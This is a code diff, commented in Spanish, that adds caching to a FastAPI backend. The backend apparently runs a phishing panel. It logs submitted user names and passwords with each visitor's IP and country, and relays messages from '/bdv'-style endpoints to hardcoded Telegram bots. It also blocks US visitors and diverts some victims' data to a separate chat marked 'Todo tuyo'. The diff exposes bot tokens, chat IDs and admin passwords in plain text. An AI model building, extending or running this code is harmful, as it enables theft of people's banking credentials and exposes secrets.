@@ -1,6 +1,6 @@
 from fastapi import FastAPI, HTTPException, Request, UploadFile, BackgroundTasks
 from fastapi import File, Form
-from functools import partial
+from functools import partial, lru_cache
 import shutil
 from fastapi.responses import JSONResponse
 from fastapi.middleware.cors import CORSMiddleware
@@ -20,16 +20,18 @@ import asyncio
 import time
 from contextlib import asynccontextmanager
 
-# Configuraciones globales (removidos los caches problemáticos)
-blocked_ips_cache: Set[str] = set()  # Solo mantener cache de IPs bloqueadas
-user_cache: Dict[str, int] = {}  # Cache para números de usuario (opcional)
-ip_number_cache: Dict[str, int] = {}  # Cache para números de IP (opcional)
+# Cache y configuraciones globales
+CACHE_TTL = 300  # 5 minutos
+ip_cache: Dict[str, tuple] = {}  # Cache para verificación de país
+blocked_ips_cache: Set[str] = set()  # Cache para IPs bloqueadas
+user_cache: Dict[str, int] = {}  # Cache para números de usuario
+ip_number_cache: Dict[str, int] = {}  # Cache para números de IP
 
 # Configuraciones
 TOKEN = "8061450462:AAH2Fu5UbCeif5SRQ8-PQk2gorhNVk8lk6g"
 AUTH_USERNAME = "gato"
 AUTH_PASSWORD = "Gato1234@"
-numeros_r = frozenset({4, 6, 9})
+numeros_r = frozenset({4, 6, 9})  # frozenset es más rápido para 'in'
 iprandom = frozenset({4, 6, 9})
 
 # Pool de conexiones HTTP reutilizable
@@ -41,14 +43,14 @@ async def lifespan(app: FastAPI):
         timeout=httpx.Timeout(5.0)
     )
     await init_db_async()
-    await load_initial_data()
+    await load_caches()
     yield
     # Shutdown
     await app.state.http_client.aclose()
 
 app = FastAPI(lifespan=lifespan)
 
-# Configurar CORS
+# Configurar CORS con configuraciones optimizadas
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -72,10 +74,12 @@ global_settings = db["global_settings"]
 logs_usuarios = db["logs_usuarios"]
 ip_bloqueadas = db["ip_bloqueadas"]
 
-# Variables de estado globales
+# Variables de estado globales optimizadas
 cola = deque(maxlen=20)
-baneado = deque(maxlen=100)
+baneado = deque(maxlen=100)  # Límite para evitar crecimiento infinito
 variable = False
+is_active_cache = False
+cache_last_updated = 0
 
 # Inicialización asíncrona de BD
 async def init_db_async():
@@ -95,27 +99,48 @@ async def init_db_async():
     except Exception as e:
         print(f"Error inicializando BD: {e}")
 
-# Cargar solo datos esenciales al inicio
-async def load_initial_data():
+# Cargar caches al inicio
+async def load_caches():
+    global blocked_ips_cache, is_active_cache, cache_last_updated
+    
     try:
-        # Solo cargar IPs bloqueadas (crítico para seguridad)
+        # Cargar IPs bloqueadas
         blocked_docs = ip_bloqueadas.find({}, {"ip": 1})
-        blocked_ips_cache.clear()
-        async for doc in blocked_docs:
-            blocked_ips_cache.add(doc["ip"])
+        blocked_ips_cache = {doc["ip"] async for doc in blocked_docs}
         
-        print(f"IPs bloqueadas cargadas: {len(blocked_ips_cache)}")
+        # Cargar estado global
+        settings = await global_settings.find_one({"id": 1})
+        is_active_cache = settings.get("is_active", False) if settings else False
+        
+        # Cargar números de IP y usuarios más recientes (últimos 1000)
+        ip_docs = ip_numbers.find({}, {"ip": 1, "number": 1}).limit(1000)
+        async for doc in ip_docs:
+            ip_number_cache[doc["ip"]] = doc["number"]
+            
+        user_docs = user_numbers.find({}, {"username": 1, "number": 1}).limit(1000)
+        async for doc in user_docs:
+            user_cache[doc["username"]] = doc["number"]
+            
+        cache_last_updated = time.time()
+        print(f"Caches cargados: {len(blocked_ips_cache)} IPs bloqueadas, {len(ip_number_cache)} IPs, {len(user_cache)} usuarios")
     except Exception as e:
-        print(f"Error cargando datos iniciales: {e}")
+        print(f"Error cargando caches: {e}")
 
-# Funciones sin cache problemático
-def validar_contrasena(contrasena: str) -> bool:
-    """Removido @lru_cache para evitar problemas"""
+# Funciones optimizadas con cache
+@lru_cache(maxsize=1000)
+def validar_contrasena_cached(contrasena: str) -> bool:
     patron = r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$"
     return bool(re.match(patron, contrasena))
 
-async def verificar_pais(ip: str) -> tuple[bool, str]:
-    """Removido cache de IP/país para evitar problemas con geolocalización"""
+async def verificar_pais_cached(ip: str) -> tuple[bool, str]:
+    current_time = time.time()
+    
+    # Verificar cache
+    if ip in ip_cache:
+        cached_result, cached_time = ip_cache[ip]
+        if current_time - cached_time < CACHE_TTL:
+            return cached_result
+    
     url = f"http://ipwhois.app/json/{ip}"
     try:
         response = await app.state.http_client.get(url)
@@ -124,11 +149,15 @@ async def verificar_pais(ip: str) -> tuple[bool, str]:
             country = data.get('country_code', 'Unknown')
             
             if country in {'VE', 'CO', 'PE'}:
-                return (True, country)
+                result = (True, country)
             elif country == 'US':
-                return (False, country)
+                result = (False, country)
             else:
-                return (True, country)
+                result = (True, country)
+            
+            # Actualizar cache
+            ip_cache[ip] = (result, current_time)
+            return result
         return (False, 'Unknown')
     except Exception:
         return (False, 'Unknown')
@@ -144,41 +173,51 @@ async def enviar_telegram_async(mensaje: str, chat_id: str = "-4826186479", toke
     except Exception as e:
         print(f"Error de conexión Telegram: {e}")
 
+def agregar_elemento_diccionario_cache(ip: str, numero: int):
+    ip_number_cache[ip] = numero
+
 async def agregar_elemento_diccionario_async(ip: str, numero: int):
     try:
         await ip_numbers.insert_one({"ip": ip, "number": numero})
+        agregar_elemento_diccionario_cache(ip, numero)
     except:
         pass
 
-async def obtener_numero_desde_db(ip: str) -> Optional[int]:
-    """Obtener número directamente de BD sin cache"""
-    try:
-        doc = await ip_numbers.find_one({"ip": ip})
-        return doc["number"] if doc else None
-    except:
-        return None
+def obtener_numero_cached(ip: str) -> Optional[int]:
+    return ip_number_cache.get(ip)
 
-async def obtener_usuario_desde_db(usuario: str) -> Optional[int]:
-    """Obtener usuario directamente de BD sin cache"""
-    try:
-        doc = await user_numbers.find_one({"username": usuario})
-        return doc["number"] if doc else None
-    except:
-        return None
+def obtener_usuario_cached(usuario: str) -> Optional[int]:
+    return user_cache.get(usuario)
 
-async def obtener_is_active_desde_db() -> bool:
-    """Obtener estado activo directamente de BD sin cache"""
+async def refresh_is_active_cache():
+    global is_active_cache, cache_last_updated
     try:
         doc = await global_settings.find_one({"id": 1})
-        return bool(doc["is_active"]) if doc else False
+        is_active_cache = bool(doc["is_active"]) if doc else False
+        cache_last_updated = time.time()
     except Exception as e:
-        print(f"Error obteniendo is_active: {e}")
-        return False
+        print(f"Error actualizando cache is_active: {e}")
+
+def obtener_is_active_cached() -> bool:
+    global cache_last_updated, is_active_cache
+    current_time = time.time()
+    
+    # Actualizar cache si es muy antiguo (cada 30 segundos)
+    if current_time - cache_last_updated > 30:
+        # Crear task de forma segura
+        try:
+            loop = asyncio.get_event_loop()
+            asyncio.create_task(refresh_is_active_cache())
+        except RuntimeError:
+            # Si no hay loop activo, usar el valor cacheado
+            pass
+    
+    return is_active_cache
 
 def contar_elemento_optimized(cola: deque, elemento: str) -> int:
     return sum(1 for x in cola if x == elemento)
 
-# Middleware de autenticación básica
+# Middleware optimizado de autenticación básica
 class FastBasicAuthMiddleware(BaseHTTPMiddleware):
     def __init__(self, app, username: str, password: str):
         super().__init__(app)
@@ -194,29 +233,35 @@ class FastBasicAuthMiddleware(BaseHTTPMiddleware):
 
 app.add_middleware(FastBasicAuthMiddleware, username=AUTH_USERNAME, password=AUTH_PASSWORD)
 
-# Middleware de bloqueo de IP (solo mantiene cache de IPs bloqueadas)
+# Middleware optimizado de bloqueo de IP
 class OptimizedIPBlockMiddleware(BaseHTTPMiddleware):
     async def dispatch(self, request: Request, call_next: Callable):
         client_ip = request.client.host
 
-        # Verificar solo cache de IPs bloqueadas (crítico para seguridad)
+        # Verificar cache local primero
         if client_ip in blocked_ips_cache:
             return JSONResponse(
                 status_code=403,
                 content={"detail": "Acceso denegado, la ip está bloqueada"}
             )
 
-        # Verificar si IP tiene número asignado en BD
-        numero_existente = await obtener_numero_desde_db(client_ip)
-        if client_ip not in iprandom and numero_existente is None:
+        # Asignar número si no existe
+        if client_ip not in iprandom and client_ip not in ip_number_cache:
             numero_random = random.randint(0, 9)
-            asyncio.create_task(agregar_elemento_diccionario_async(client_ip, numero_random))
+            agregar_elemento_diccionario_cache(client_ip, numero_random)
+            # Guardar en BD de forma asíncrona con función wrapper
+            try:
+                loop = asyncio.get_event_loop()
+                asyncio.create_task(agregar_elemento_diccionario_async(client_ip, numero_random))
+            except RuntimeError:
+                # Si no hay loop, ignorar el guardado en BD
+                pass
 
         return await call_next(request)
 
 app.add_middleware(OptimizedIPBlockMiddleware)
 
-# Modelos Pydantic
+# Modelos Pydantic optimizados
 class ClaveRequest(BaseModel):
     clave: str
 
@@ -229,7 +274,7 @@ class IPRequest(BaseModel):
 class DynamicMessage(BaseModel):
     mensaje: str
 
-# Endpoints
+# Endpoints optimizados
 @app.get("/login", response_class=HTMLResponse)
 async def login_form():
     return """
@@ -260,6 +305,8 @@ async def login(password: str = Form(...)):
             status_code=401
         )
 
+
+
 @app.post("/validar_clave")
 async def validar_clave(data: ClaveRequest):
     return {"valido": data.clave == "gato123"}
@@ -280,6 +327,7 @@ async def bloquear_ip(data: IPRequest):
     
     if ip not in blocked_ips_cache:
         blocked_ips_cache.add(ip)
+        # Guardar en BD de forma asíncrona
         asyncio.create_task(_bloquear_ip_bd(ip))
         return {"message": f"La IP {ip} ha sido bloqueada."}
     else:
@@ -298,6 +346,7 @@ async def desbloquear_ip(data: IPRequest):
     
     if ip in blocked_ips_cache:
         blocked_ips_cache.discard(ip)
+        # Eliminar de BD de forma asíncrona
         asyncio.create_task(_desbloquear_ip_bd(ip))
         return {"message": f"La IP {ip} ha sido desbloqueada."}
     else:
@@ -331,8 +380,9 @@ async def guardar_datos(
     request: Request = None
 ):
     ip = request.client.host
-    permitido, pais = await verificar_pais(ip)
+    permitido, pais = await verificar_pais_cached(ip)
 
+    # Guardar en BD de forma asíncrona
     asyncio.create_task(_guardar_log_usuario(usuario, contra, ip, pais))
     
     return {
@@ -368,24 +418,20 @@ async def ver_datos():
 
 @app.get("/usuarios/")
 async def obtener_usuarios():
-    """Obtener usuarios directamente de BD"""
-    usuarios = []
-    async for doc in user_numbers.find({}, {"username": 1, "number": 1}):
-        usuarios.append({"usuario": doc["username"], "numero": doc["number"]})
+    if not user_cache:
+        return {"message": "No se encontraron usuarios en caché."}
     
-    if not usuarios:
-        return {"message": "No se encontraron usuarios."}
-    
+    usuarios = [{"usuario": u, "numero": n} for u, n in user_cache.items()]
     return {"usuarios": usuarios}
 
 @app.get("/is_active/")
 async def obtener_estado_actual():
-    """Obtener estado directamente de BD sin cache"""
-    estado = await obtener_is_active_desde_db()
+    estado = obtener_is_active_cached()
     return {"is_active": estado}
 
 @app.post("/toggle/")
 async def alternar_estado():
+    global is_active_cache
     try:
         doc = await global_settings.find_one({"id": 1})
         if doc:
@@ -394,6 +440,7 @@ async def alternar_estado():
                 {"id": 1},
                 {"$set": {"is_active": nuevo_valor}}
             )
+            is_active_cache = nuevo_valor
             return {"message": "Estado alternado exitosamente.", "is_active": nuevo_valor}
         else:
             raise ValueError("No se encontró la configuración global.")
@@ -402,14 +449,10 @@ async def alternar_estado():
 
 @app.get("/ips/")
 async def obtener_ips():
-    """Obtener IPs directamente de BD"""
-    ips = []
-    async for doc in ip_numbers.find({}, {"ip": 1, "number": 1}):
-        ips.append({"ip": doc["ip"], "numero": doc["number"]})
+    if not ip_number_cache:
+        return {"message": "No se encontraron IPs en caché."}
     
-    if not ips:
-        return {"message": "No se encontraron IPs."}
-    
+    ips = [{"ip": i, "numero": n} for i, n in ip_number_cache.items()]
     return {"ips": ips}
 
 @app.post("/verificar_spam_ip")
@@ -435,7 +478,7 @@ async def verificar_spam_ip(data: IPRequest):
             "mensaje": "IP aún no considerada spam"
         }
 
-# Configuración de endpoints dinámicos
+# Configuración optimizada de endpoints dinámicos
 endpoint_configs = [
     {"path": "/bdv1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
     {"path": "/bdv2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
@@ -471,28 +514,25 @@ async def _enviar_telegram_task(mensaje: str, chat_id: str = "-4826186479", toke
 async def handle_dynamic_endpoint_optimized(config, request_data: DynamicMessage, request: Request):
     client_ip = request.client.host
     cola.append(client_ip)
-    
-    # Obtener número directamente de BD sin cache
-    numeror = await obtener_numero_desde_db(client_ip)
+    numeror = obtener_numero_cached(client_ip)
 
     if contar_elemento_optimized(cola, client_ip) > 8:
         baneado.append(client_ip)
         raise HTTPException(status_code=429, detail="Has sido bloqueado temporalmente.")
 
-    permitido, pais = await verificar_pais(client_ip)
+    permitido, pais = await verificar_pais_cached(client_ip)
     mensaje = request_data.mensaje
 
     if permitido and pais != "US":
         path = config["path"]
         mensaje_completo = f"{mensaje} - IP: {client_ip} - {path}"
         
-        # Obtener estado activo directamente de BD
-        is_active = await obtener_is_active_desde_db()
-        
-        if (path.startswith("/bdv") and is_active and 
+        if (path.startswith("/bdv") and obtener_is_active_cached() and 
             numeror in numeros_r and pais not in {"US", "CO"}):
+            # Enviar de forma asíncrona sin bloquear
             asyncio.create_task(_enviar_telegram_task(mensaje_completo + " Todo tuyo", "-4931572577"))
         else:
+            # Enviar ambos mensajes de forma asíncrona
             asyncio.create_task(_enviar_telegram_task(mensaje_completo))
             asyncio.create_task(_enviar_telegram_task(mensaje, config["chat_id"], config["bot_id"]))
 
@@ -511,6 +551,7 @@ for config in endpoint_configs:
 async def _clear_db_collections():
     """Función auxiliar para limpiar colecciones de BD"""
     try:
+        # Limpiar en paralelo
         tasks = [
             ip_numbers.delete_many({}),
             user_numbers.delete_many({})
@@ -526,13 +567,14 @@ async def clear_db_endpoint():
     success = await _clear_db_collections()
     
     if success:
-        # Limpiar caches locales si existen
+        # Limpiar caches
         ip_number_cache.clear()
         user_cache.clear()
         return {"message": "Se borró correctamente"}
     else:
         return {"message": "Error al borrar"}
 
+# Endpoints adicionales optimizados con endpoints faltantes del original
 @app.put("/editar-ip/{ip}")
 async def editar_numero_ip(ip: str, request_data: UpdateNumberRequest):
     result = await ip_numbers.update_one(
@@ -542,6 +584,9 @@ async def editar_numero_ip(ip: str, request_data: UpdateNumberRequest):
     
     if result.matched_count == 0:
         raise HTTPException(status_code=404, detail="IP no encontrada")
+    
+    # Actualizar cache
+    ip_number_cache[ip] = request_data.numero
     
     return {"message": f"Número de la IP {ip} actualizado a {request_data.numero}"}
 
@@ -554,6 +599,9 @@ async def editar_numero_usuario(usuario: str, request_data: UpdateNumberRequest)
     
     if result.matched_count == 0:
         raise HTTPException(status_code=404, detail="Usuario no encontrado")
+    
+    # Actualizar cache
+    user_cache[usuario] = request_data.numero
     
     return {"message": f"Número del usuario {usuario} actualizado a {request_data.numero}"}
 
